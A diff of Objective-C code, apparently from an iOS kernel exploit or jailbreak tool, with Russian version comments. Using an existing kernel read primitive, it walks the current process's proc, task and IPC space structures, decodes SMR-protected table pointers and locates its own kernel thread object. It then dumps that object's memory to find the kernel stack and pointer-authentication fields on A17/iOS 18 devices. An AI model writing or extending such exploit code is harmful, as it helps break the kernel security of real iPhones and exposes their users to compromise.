@@ -2350,17 +2350,50 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                     if (kpLooksLikeKernelPointer(th)) {
                         uint64_t rop = off_thread_machine_rop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_rop_pid)) : 0;
                         uint64_t jop = off_thread_machine_jop_pid ? kp_untag_ptr(early_kread64(th + off_thread_machine_jop_pid)) : 0;
-                        // 2.0.104: точные offset'ы A17 iOS18: kstack=0x148 rop=0x1b8 jop=0x1c0
-                        uint64_t kstack = kp_untag_ptr(early_kread64(th + 0x148));
-                        uint64_t rop2 = kp_untag_ptr(early_kread64(th + 0x1b8));
-                        uint64_t jop2 = kp_untag_ptr(early_kread64(th + 0x1c0));
-                        uint64_t opts2 = early_kread64(th + 0xC0);
-                        uint64_t opts3 = early_kread64(th + 0x180);
-                        kpNote(r, [NSString stringWithFormat:@"  [BOOT] selfTh=%#llx kstack@148=%#llx rop@1b8=%#llx jop@1c0=%#llx",
-                                  (unsigned long long)th, (unsigned long long)kstack,
-                                  (unsigned long long)rop2, (unsigned long long)jop2]);
-                        kpNote(r, [NSString stringWithFormat:@"  [BOOT] opts@c0=%#llx opts@180=%#llx",
-                                  (unsigned long long)opts2, (unsigned long long)opts3]);
+                        // 2.0.105: mach_thread_self → isTable → kobject (как IOSurface)
+                        {
+                            mach_port_t myPort = mach_thread_self();
+                            uint64_t isT = 0;
+                            uint64_t prT = [self findSelfProcByPidFast:(uint32_t)getpid() log:nil];
+                            uint64_t roT = prT ? kp_untag_ptr(early_kread64(prT + koffsetof(proc, proc_ro))) : 0;
+                            uint64_t tkT = roT ? kp_untag_ptr(early_kread64(roT + off_proc_ro_pr_task)) : 0;
+                            uint64_t spT = tkT ? kp_untag_ptr(early_kread64(tkT + off_task_itk_space)) : 0;
+                            uint64_t tbT = spT ? early_kread64(kp_untag_ptr(spT) + off_ipc_space_is_table) : 0;
+                            if (tbT) isT = (koffsetof(ipc_space, table_uses_smr) && smr_base && t1sz_boot)
+                                         ? kp_untag_ptr(kpSMRDecode(tbT)) : kp_untag_ptr(tbT);
+                            kpNote(r, [NSString stringWithFormat:@"  [BOOT] port=0x%x isTable=%#llx", myPort, (unsigned long long)isT]);
+                            uint64_t thK = 0;
+                            if (isT) {
+                                uint64_t eVA = isT + (uint64_t)sizeof_ipc_entry * (myPort >> 8);
+                                uint64_t ieObj = kp_untag_ptr(early_kread64(eVA + off_ipc_entry_ie_object));
+                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] ie_object=%#llx", (unsigned long long)ieObj]);
+                                if (kpLooksLikeKernelPointer(ieObj)) {
+                                    for (uint32_t ko = 0x18; ko <= 0x50; ko += 8) {
+                                        uint64_t cand = kp_untag_ptr(early_kread64(ieObj + ko));
+                                        if (!kpLooksLikeKernelPointer(cand)) continue;
+                                        uint64_t tro = kp_untag_ptr(early_kread64(cand + off_thread_t_tro));
+                                        if (kpLooksLikeKernelPointer(tro)) {
+                                            thK = cand;
+                                            kpNote(r, [NSString stringWithFormat:@"  [BOOT] thread*=%#llx via +x%x", (unsigned long long)cand, ko]);
+                                            break;
+                                        }
+                                    }
+                                }
+                            }
+                            if (thK) {
+                                uint64_t kstack = kp_untag_ptr(early_kread64(thK + 0x148));
+                                uint64_t opts = early_kread64(thK + 0xC0);
+                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] kstack@148=%#llx opts@c0=%#llx",
+                                          (unsigned long long)kstack, (unsigned long long)opts]);
+                                NSMutableString *td = [NSMutableString string];
+                                for (uint32_t o = 0; o < 0x200; o += 8) {
+                                    uint64_t q = early_kread64(thK + o);
+                                    if (kpLooksLikeKernelPointer(q)) [td appendFormat:@" +%x:%#018llx", o, (unsigned long long)q];
+                                }
+                                kpNote(r, [NSString stringWithFormat:@"  [BOOT] thread-dump:%@", td]);
+                            }
+                            mach_port_deallocate(mach_task_self(), myPort);
+                        }
                         // 2.0.97: дамп thread* 0x00..0x200 — ищем kstack/PAC по контенту
                         NSMutableString *tdd = [NSMutableString string];
                         for (uint32_t o = 0; o < 0x200; o += 8) {
